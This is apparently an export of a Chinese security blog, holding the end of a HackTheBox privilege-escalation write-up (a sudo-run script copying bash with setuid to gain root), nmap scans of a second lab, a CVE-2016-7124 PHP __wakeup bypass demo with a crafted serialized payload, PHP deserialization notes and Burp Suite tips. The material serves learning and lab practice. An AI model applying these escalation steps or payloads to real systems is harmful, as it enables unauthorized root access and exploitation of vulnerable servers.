</blockquote>
<p>得：所读取路径不是绝对路径，它在当前目录下找full-checkup.sh的，如果在用户界面中非&#x2F;opt&#x2F;scripts&#x2F;位置下，就会出现报错。</p>
<p>vim full-checkup.sh，内容为：</p>
<blockquote>
<p>#!&#x2F;bin&#x2F;bash<br>cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;bash<br>chmod +s &#x2F;tmp&#x2F;bash</p>
</blockquote>
<p>这段脚本的作用是创建了一个具有Setuid权限的”&#x2F;tmp&#x2F;bash”文件。通过设置Setuid权限，任何以该文件执行的用户都会暂时获得文件所有者（通常为root）的权限。这意味着，当普通用户执行”&#x2F;tmp&#x2F;bash”时，它将以root用户的权限执行，从而实现了权限提升。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-bash-5.1$ whoami</span><br><span class="line">svc</span><br><span class="line">-bash-5.1$ pwd</span><br><span class="line">/home/svc</span><br><span class="line">-bash-5.1$ vim full-checkup.sh</span><br><span class="line">-bash-5.1$ chmod +x full-checkup.sh</span><br><span class="line">-bash-5.1$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup</span><br><span class="line">[sudo] password for svc: </span><br><span class="line"></span><br><span class="line">[+] Done!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-bash-5.1$ whoami</span><br><span class="line">svc</span><br><span class="line">-bash-5.1$ ls -la /bin/bash</span><br><span class="line">-rwsr-sr-x 1 root root 1396520 Jan  6  2022 /bin/bash</span><br><span class="line"></span><br><span class="line">成功给 /bin/bash 带上suid提权成功</span><br><span class="line">-bash-5.1$ /bin/bash -p</span><br><span class="line">bash-5.1# whoami</span><br><span class="line">root</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash-5.1# cd /root</span><br><span class="line">bash-5.1# ls -la</span><br><span class="line">total 60</span><br><span class="line">drwx------  9 root root 4096 Apr  3 16:01 .</span><br><span class="line">drwxr-xr-x 19 root root 4096 Mar  1 10:46 ..</span><br><span class="line">lrwxrwxrwx  1 root root    9 Feb 20 12:09 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc</span><br><span class="line">drwx------  3 root root 4096 Mar  1 10:46 .cache</span><br><span class="line">drwx------  3 root root 4096 Mar  1 10:46 .config</span><br><span class="line">-rw-r-----  1 root root  430 Apr  3 15:13 ecosystem.config.js</span><br><span class="line">-rw-r--r--  1 root root  104 Apr  3 08:58 .gitconfig</span><br><span class="line">drwxr-xr-x  3 root root 4096 Mar  1 10:46 .local</span><br><span class="line">-rw-------  1 root root   50 Feb 20 12:04 .my.cnf</span><br><span class="line">lrwxrwxrwx  1 root root    9 Feb 20 12:12 .mysql_history -&gt; /dev/null</span><br><span class="line">drwxr-xr-x  4 root root 4096 Mar  1 10:46 .npm</span><br><span class="line">drwxr-xr-x  5 root root 4096 Jun  7 04:20 .pm2</span><br><span class="line">-rw-r--r--  1 root root  161 Jul  9  2019 .profile</span><br><span class="line">-rw-r-----  1 root root   33 Jun  7 04:20 root.txt</span><br><span class="line">drwxr-xr-x  4 root root 4096 Apr  3 16:01 scripts</span><br><span class="line">drwx------  3 root root 4096 Mar  1 10:46 snap</span><br><span class="line">bash-5.1# cat root.txt</span><br><span class="line">105666c0b97b4202de7dabf892feb190</span><br><span class="line">bash-5.1# </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>跟随大佬的wp思路进行，达到提权的目的。</p>
<p>1.nmap扫到端口为80，与22</p>
<p>2.访问80端口位置，进行反弹shell。</p>
<p>3.遍历各文件夹，找到敏感信息</p>
<p>4.拿到普通用户的账号和密码，尝试22端口的ssh连接。</p>
<p>5.由普通用户进行提权。</p>
<p>其中有很多细节有待细究，值得复盘。</p>
<h2 id="2-Escape"><a href="#2-Escape" class="headerlink" title="2.Escape"></a>2.Escape</h2><h3 id="1-参考"><a href="#1-参考" class="headerlink" title="1.参考"></a>1.参考</h3><p><a href="http://t.csdn.cn/xUqAI">http://t.csdn.cn/xUqAI</a></p>
<p><a href="https://www.bilibili.com/video/BV12k4y1J7zE/?spm_id_from=333.337.search-card.all.click&vd_source=c49e37118f69c7a5b34915b73d1b78ab">hackthebox中等难度靶场escape渗透全过程_哔哩哔哩_bilibili</a></p>
<p>nmap:</p>
<p><code>nmap -p- -sT --min-rate=1000 -Pn 10.10.11.202</code></p>
<blockquote>
<p>参数解释：</p>
<p>-p- 所有端口</p>
<p>-sT TCP连接</p>
<p>–min-rate&#x3D;1000 1秒发送1000个请求</p>
<p>-Pn 禁用主机发现</p>
<p>结果为：</p>
<p>53&#x2F;tcp    open  domain<br>88&#x2F;tcp    open  kerberos-sec<br>135&#x2F;tcp   open  msrpc<br>139&#x2F;tcp   open  netbios-ssn<br>389&#x2F;tcp   open  ldap<br>445&#x2F;tcp   open  microsoft-ds<br>464&#x2F;tcp   open  kpasswd5<br>593&#x2F;tcp   open  http-rpc-epmap<br>636&#x2F;tcp   open  ldapssl<br>3269&#x2F;tcp  open  globalcatLDAPssl<br>9389&#x2F;tcp  open  adws<br>49667&#x2F;tcp open  unknown<br>49687&#x2F;tcp open  unknown<br>49705&#x2F;tcp open  unknown<br>49711&#x2F;tcp open  unknown</p>
</blockquote>
<p><code>nmap -p- -sU --min-rate=1000 -Pn 10.10.11.202</code></p>
<blockquote>
<p>PORT    STATE SERVICE<br>53&#x2F;udp  open  domain<br>123&#x2F;udp open  ntp</p>
</blockquote>
<p>vim port.txt，将nmap中tcp扫描到的内容复制过去，通过正则过滤拼接出需要的端口号。提取每行”&#x2F;“之前的内容，再拼接即可</p>
<p>awk -F’&#x2F;‘ ‘{print $1}’  ORS&#x3D;’,’  port.txt  | tr -d ‘,’</p>
<blockquote>
<ol>
<li><p><code>awk</code>命令：<code>awk</code>是一个文本处理工具，用于按照指定的规则对文本进行处理。它按行读取输入，并根据给定的规则执行操作。</p>
</li>
<li><p><code>-F&#39;/&#39;</code>：<code>-F</code>选项用于指定字段分隔符。在这个命令中，我们将字段分隔符设置为斜杠（&#x2F;），以便将每行拆分为多个字段。</p>
</li>
<li><p><code>&#39;&#123;print $1&#125;&#39;</code>：这是一个<code>awk</code>的操作部分，指定要执行的操作。<code>$1</code>表示打印第一个字段。</p>
</li>
<li><p>默认情况下，<code>ORS</code>的值是一个换行符（<code>\n</code>），这意味着每个<code>print</code>语句打印的内容将以换行符分隔。但是，您可以通过修改<code>ORS</code>的值来指定不同的分隔符。</p>
</li>
</ol>
<p>  在这种情况下，我们使用<code>ORS=&#39;,&#39;</code>将<code>ORS</code>设置为逗号（<code>,</code>）。这样，当<code>print</code>语句执行时，它将使用逗号作为记录之间的分隔符，而不是默认的换行符。这样就实现了将提取的端口号使用逗号拼接在一起的效果。</p>
<p>  结果为：</p>
<p>  53,88,135,139,389,445,464,593,636,3269,9389,49667,49687,49705,49711, </p>
</blockquote>
<p><code>nmap -p53,88,135,139,389,445,464,593,636,3269,9389,49667,49687,49705,49711 -Pn -sT -sC -sV 10.10.11.202</code></p>
<blockquote>
<ul>
<li><code>-sC</code>：这个参数指定在扫描期间运行默认的Nmap脚本。Nmap脚本是一组自动化的测试和攻击脚本，用于探测和利用目标主机上的漏洞或服务配置问题。</li>
<li><code>-sV</code>：这个参数指定在扫描期间进行版本探测。<code>nmap</code>将尝试识别目标主机上运行的服务和应用程序的版本信息。通过识别版本信息，可以更好地了解目标主机上的系统配置和潜在的安全风险。</li>
</ul>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time:------)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=dc.sequel.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.sequel.htb</span><br><span class="line">| Not valid before: 2022-11-18T21:20:35</span><br><span class="line">|_Not valid after:  2023-11-18T21:20:35</span><br><span class="line">|_ssl-date: 2023-06-07T21:55:16+00:00; +8h00m00s from scanner time.</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: ------T21:55:17+00:00; +8h00m00s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=dc.sequel.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.sequel.htb</span><br><span class="line">| Not valid before: 2022-11-18T21:20:35</span><br><span class="line">|_Not valid after:  2023-11-18T21:20:35</span><br><span class="line">3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: -----T21:55:19+00:00; +8h00m00s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=dc.sequel.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.sequel.htb</span><br><span class="line">| Not valid before: 2022-11-18T21:20:35</span><br><span class="line">|_Not valid after:  2023-11-18T21:20:35</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49687/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49705/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49711/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: -------T21:54:38</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   311: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>发现域名sequel.htb与子域名dc.sequel.htb</p>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>靶场</tag>
        <tag>渗透测试</tag>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE学习</title>
    <url>/2023/05/20/CVE%E9%83%A8%E5%88%86/</url>
    <content><![CDATA[<h1 id="CVE-2016-7124"><a href="#CVE-2016-7124" class="headerlink" title="CVE-2016-7124"></a>CVE-2016-7124</h1><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>服务器：apache 2.4.39</p>
<p>PHP版本：5.3.29nts</p>
<h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><p>PHP5 &lt; 5.6.25</p>
<p>PHP7 &lt; 7.0.10</p>
<h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><p>类中的wakeup()方法的绕过</p>
<h2 id="代码复现"><a href="#代码复现" class="headerlink" title="代码复现"></a>代码复现</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yuleiyun</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$target</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$b</span>=<span class="string">&quot;b&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	 <span class="variable language_">$this</span>-&gt;num=<span class="string">&quot;123&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="variable language_">$this</span>-&gt;targer=<span class="string">&quot;10&quot;</span>;</span><br><span class="line">	   <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;num)||!<span class="variable language_">$this</span>-&gt;num)</span><br><span class="line">		   <span class="keyword">echo</span> <span class="string">&quot;you got it!&quot;</span>; </span><br><span class="line">	   <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;haha&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>逻辑为：destruct中的num值未设置或者为空时，才会有输出。</p>
<p>已知num这个值无法更改，所以尝试使num值未设置，则要绕过wakeup()。首先我们上传的参数要为序列化后的字符串：</p>
<p>如：</p>
<blockquote>
<p>?test&#x3D;O:8:”Yuleiyun”:2:{s:6:”target”;N;s:1:”b”;s:1:”b”;}</p>
<p>结果：</p>
<p>object(Yuleiyun)#1 (3) { [“target”]&#x3D;&gt; NULL [“b”]&#x3D;&gt; string(1) “b” [“num”]&#x3D;&gt; string(3) “123” } haha</p>
</blockquote>
<p>由于wakeup函数存在且比反序列化先触发，故，只要使得反序列化过程中的结构不匹配，导致 PHP 在反序列化时无法正确还原对象的结构，进而无法触发wakeup()方法。</p>
<p>如把成员数量由2改为3，不触发wakeup()，结果为</p>
<blockquote>
<p>?test&#x3D;O:8:”Yuleiyun”:3:{s:6:”target”;N;s:1:”b”;s:1:”b”;}</p>
<p>结果：</p>
<p>you got it!bool(false)</p>
</blockquote>
]]></content>
      <categories>
        <category>CVE</category>
      </categories>
      <tags>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>php反序列化</title>
    <url>/2023/05/29/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="1-参考文章"><a href="#1-参考文章" class="headerlink" title="1.参考文章"></a>1.参考文章</h1><p><a href="https://xz.aliyun.com/t/12507">php反序列化完整总结 - 先知社区 (aliyun.com)</a></p>
<p><a href="https://spaceman-911.gitee.io/2021/06/30/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E8%B6%85%E7%BB%86%E7%9A%84%EF%BC%89/">PHP-反序列化（超细的） | spaceman’blog (gitee.io)</a></p>
<h1 id="2-反序列化"><a href="#2-反序列化" class="headerlink" title="2.反序列化"></a>2.反序列化</h1><p>php中，序列化函数serialize()，反序列化函数unserialize()。</p>
<p>序列化：将对象序列化为一串字符串；</p>
<p>反序列化相反。</p>
<p>并非只对类可以序列化，数组也可以的。</p>
<h2 id="序列化演示："><a href="#序列化演示：" class="headerlink" title="序列化演示："></a>序列化演示：</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">classAAA</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&quot;yuleiyun&quot;</span>;</span><br><span class="line">	 <span class="keyword">protected</span> <span class="variable">$b</span>=<span class="string">&quot;yunque&quot;</span>;</span><br><span class="line">	 <span class="keyword">private</span> <span class="variable">$c</span>=<span class="string">&quot;haha&quot;</span>;</span><br><span class="line">	 <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	 </span>&#123;</span><br><span class="line">		 <span class="keyword">echo</span> <span class="string">&quot;test,ok&quot;</span>;</span><br><span class="line">	 &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="variable">$test</span>=<span class="keyword">new</span> <span class="title function_ invoke__">classAAA</span>();</span><br><span class="line"><span class="variable">$test1</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test1</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果为：</p>
<blockquote>
<p>O:8:”classAAA”:3:{s:1:”a”;s:8:”yuleiyun”;s:4:”*b”;s:6:”yunque”;s:11:”classAAAc”;s:4:”haha”;}</p>
</blockquote>
<p>对以上结构分析得：</p>
<blockquote>
<p><em>O:对象名的长度:”对象名”:对象属性个数:{s:属性名的长度:”属性名”;s:属性值的长度:”属性值”;}</em></p>
</blockquote>
<p>a是public类型的变量，s表示字符串，8表示变量名的长度，a是变量名。</p>
<p>b是protected类型的变量，它的变量名长度为4，protected属性的表示方式是在变量名前加上%00*%00，这个长度就是3了，%00很熟悉了，ASCII码即为0。</p>
<p>c是private类型的变量，c的变量名前添加了%00类名%00。所以，private属性的表示方式是在变量名前加上%00类名%00。</p>
<p>而且可见，序列化字符串中<strong>只保存变量</strong>，不保存函数方法。</p>
<h2 id="反序列化演示"><a href="#反序列化演示" class="headerlink" title="反序列化演示"></a>反序列化演示</h2><blockquote>
<p>在php下:</p>
<p>echo 输出的是变量和字符串;</p>
<p>var_dump 输出的是变量类型,变量长度和变量值;打印数组及其结构</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">classAAA</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&quot;yuleiyun&quot;</span>;</span><br><span class="line">	 <span class="keyword">protected</span> <span class="variable">$b</span>=<span class="string">&quot;yunque&quot;</span>;</span><br><span class="line">	 <span class="keyword">private</span> <span class="variable">$c</span>=<span class="string">&quot;haha&quot;</span>;</span><br><span class="line">	 <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	 </span>&#123;</span><br><span class="line">		 <span class="keyword">echo</span> <span class="string">&quot;test,ok&quot;</span>;</span><br><span class="line">	 &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="variable">$test</span>=<span class="keyword">new</span> <span class="title function_ invoke__">classAAA</span>();</span><br><span class="line"><span class="variable">$test1</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="variable">$test2</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$test1</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$test2</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果为：</p>
<blockquote>
<p>object(classAAA)#2 (3) {<br> [“a”]&#x3D;&gt;<br> string(8) “yuleiyun”<br> [“b”:protected]&#x3D;&gt;<br> string(6) “yunque”<br> [“c”:”classAAA”:private]&#x3D;&gt;<br> string(4) “haha”<br>}</p>
</blockquote>
<p>除此之外。var_dump与 echo具体输出的话，<strong>只能指向公共变量a</strong>，</p>
<p>如var_dump($test2-&gt;a);</p>
<p>否则出现:</p>
<blockquote>
<p>Fatal error: Uncaught Error: Cannot access protected property </p>
</blockquote>
<h1 id="3-漏洞产生原理"><a href="#3-漏洞产生原理" class="headerlink" title="3.漏洞产生原理"></a>3.漏洞产生原理</h1><p>与魔术方法有关，魔术方法接收了序列化后未经过滤的字符串，不当执行造成的。比如魔术方法有一些检查，你可以构造一些数据绕过这些检查，那这样未过滤的输入，危害性很大咯。</p>
<h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><blockquote>
<p>魔术方法命名是以符号<strong>开头的，比如</strong> construct, <strong>destruct,</strong> toString, <strong>sleep,</strong> wakeup等等。这些函数在某些情况下会自动调用。</p>
<ul>
<li>__construct():具有构造函数的类会在每次创建新对象时先调用此方法。</li>
<li>__destruct():析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</li>
<li>__toString()方法用于一个类被当成字符串时应怎样回应。例如echo $obj;应该显示些什么。 <strong>此方法必须返回一个字符串</strong>，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。</li>
<li>__sleep()方法在一个对象被序列化之前调用；可以指定要序列化的对象属性</li>
<li>__wakeup():unserialize( )会检查是否存在一个_wakeup( )方法。如果存在，则会先调用_wakeup方法，预先准备对象需要的资源。</li>
<li>get(),set() 当调用或设置一个类及其父类方法中未定义的属性时</li>
<li>__invoke() 调用函数的方式调用一个对象时的回应方法</li>
<li>call 和 callStatic前者是调用类不存在的方法时执行，而后者是调用类不存在的静态方式方法时执行。</li>
<li>isset()：在不可访问的属性上调用isset()或empty()触发 </li>
<li>unset()：在不可访问的属性上使用unset()时触发</li>
</ul>
</blockquote>
<p><strong>注意：php代码，执行完最后一行代码，会自动销毁变量（可能不太准确）</strong></p>
<h2 id="魔术方法执行顺序"><a href="#魔术方法执行顺序" class="headerlink" title="魔术方法执行顺序"></a>魔术方法执行顺序</h2><p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Test1</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&quot;123&quot;</span>;</span><br><span class="line">	 </span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;执行了construct&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	 <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;执行了destruct&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;执行了sleep&quot;</span>;</span><br><span class="line">		 <span class="keyword">return</span> <span class="keyword">array</span>();</span><br><span class="line">		  </span><br><span class="line">	&#125;</span><br><span class="line">	  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		 <span class="keyword">return</span> <span class="string">&quot;执行了toString&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;执行了wakeup&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;new一个对象\n&quot;</span>;</span><br><span class="line"><span class="variable">$test</span> =<span class="keyword">new</span> <span class="title class_">Test1</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n直接输出类，会调用To_string\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n序列化，先执行sleep(若有)哈，再序列化\n&quot;</span>;</span><br><span class="line"><span class="variable">$test1</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n反序列化，先执行wakeup(若有)，有则先调用wakeup\n&quot;</span>;</span><br><span class="line"><span class="variable">$test2</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$test1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果为：</p>
<blockquote>
<p>new一个对象<br>执行了construct</p>
<p>直接输出类，会调用To_string<br>执行了toString</p>
<p>序列化，先执行sleep(若有)哈，再序列化<br>执行了sleep</p>
<p>反序列化，先执行wakeup(若有)，有则先调用wakeup<br>执行了wakeup<br>执行了destruct执行了destruct</p>
</blockquote>
<p>两次destruct，销毁了反序列化对象一次，new的对象一次。</p>
<p>注意：<strong>我这里如果不在sleep指定序列化的变量，是输出不出来的（wakeup，还有反序列的结果）</strong></p>
<blockquote>
<p>public function __sleep(){<br>    echo “执行了sleep”;<br>     <strong>return array();</strong><br>}</p>
</blockquote>
<h2 id="反序列化与构造函数"><a href="#反序列化与构造函数" class="headerlink" title="反序列化与构造函数"></a>反序列化与构造函数</h2><p>虽然反序列化返回的也是一个对象。但构造函数不会在反序列化期间被调用，而是在对象创建时（使用<code>new</code>关键字）才会被调用。反序列化过程只会还原对象的状态，而不会再次创建对象。</p>
<h1 id="4-实例"><a href="#4-实例" class="headerlink" title="4.实例"></a>4.实例</h1><h2 id="wakeup绕过"><a href="#wakeup绕过" class="headerlink" title="wakeup绕过"></a>wakeup绕过</h2><p>见本博客的CVE部分的CVE-2016-7124</p>
<h4 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h4><blockquote>
<ol>
<li>未定义 <code>__wakeup()</code> 方法： 如果类的定义中没有定义 <code>__wakeup()</code> 方法，无论序列化字符串中的内容如何，都不会触发 <code>__wakeup()</code> 方法的执行。</li>
<li>类的名称不匹配： 序列化字符串中指定的类名与实际的类名不匹配，或者序列化字符串中的类不存在时，也不会触发 <code>__wakeup()</code> 方法。</li>
<li>修改类定义： 如果在序列化和反序列化之间修改了类的定义，包括类名、属性或方法的修改，可能会导致 <code>__wakeup()</code> 方法不被调用。因为序列化和反序列化过程依赖于类的定义和结构，如果类的定义发生了改变，可能无法正确还原对象的结构，进而无法触发 <code>__wakeup()</code> 方法。</li>
</ol>
</blockquote>
<h2 id="字符逃逸"><a href="#字符逃逸" class="headerlink" title="字符逃逸"></a>字符逃逸</h2><h4 id="漏洞特点"><a href="#漏洞特点" class="headerlink" title="漏洞特点"></a>漏洞特点</h4><p>1.相当于构造闭合。（已知php在反序列化时，底层代码以;作为字段分隔，以}作为结尾，且根据长度判断内容。通过构造一定范围内的….;}提前闭合，挤出后面的内容。）</p>
<p>2.长度不对应会报错。</p>
<h4 id="漏洞产生"><a href="#漏洞产生" class="headerlink" title="漏洞产生"></a>漏洞产生</h4><p>代码中存在针对序列化后的字符串进行了过滤操作。</p>
<h2 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h2><h2 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h2>]]></content>
      <categories>
        <category>web漏洞</category>
        <category>php反序列化</category>
      </categories>
      <tags>
        <tag>漏洞</tag>
        <tag>php反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>bp工具</title>
    <url>/2023/05/13/bp%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>抓包；爆破；repeat尝试；ssrf表单伪造；编码解码</p>
<p>注意里面的空格用+或%20代替</p>
<blockquote>
<p>POST &#x2F;sqli&#x2F;9.php?a&#x3D;1236 HTTP&#x2F;1.1</p>
</blockquote>
<p>否则被认为是如HTTP&#x2F;1.1这种独立的数值</p>
<h2 id="spider模块"><a href="#spider模块" class="headerlink" title="spider模块"></a>spider模块</h2><p>Spider的蜘蛛爬行功能可以帮助我们了解系统的结构，其中Spider爬取到的内容将在Target中展示，如图3-24所示，界面左侧为一个主机和目录树，选择具体某一个分支即可查看对应的请求与响应。</p>
<h2 id="decode"><a href="#decode" class="headerlink" title="decode"></a>decode</h2><p>Burp中自带的编码解码及散列转换的工具，能对原始数据进行各种编码格式和散列的转换。</p>
<h2 id="Scanner"><a href="#Scanner" class="headerlink" title="Scanner"></a>Scanner</h2><p>用于自动检测Web系统的各种漏洞。</p>
<p>分为主动扫描和被动扫描，可以在Target对分支操作，也可以去http history里</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620144628926.png"></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620144833459.png"></p>
<p>扫完后，可以右击Burp Target站点地图选项下的链接，依次选择“issues”→“Report issues”选项，然后导出漏洞报告</p>
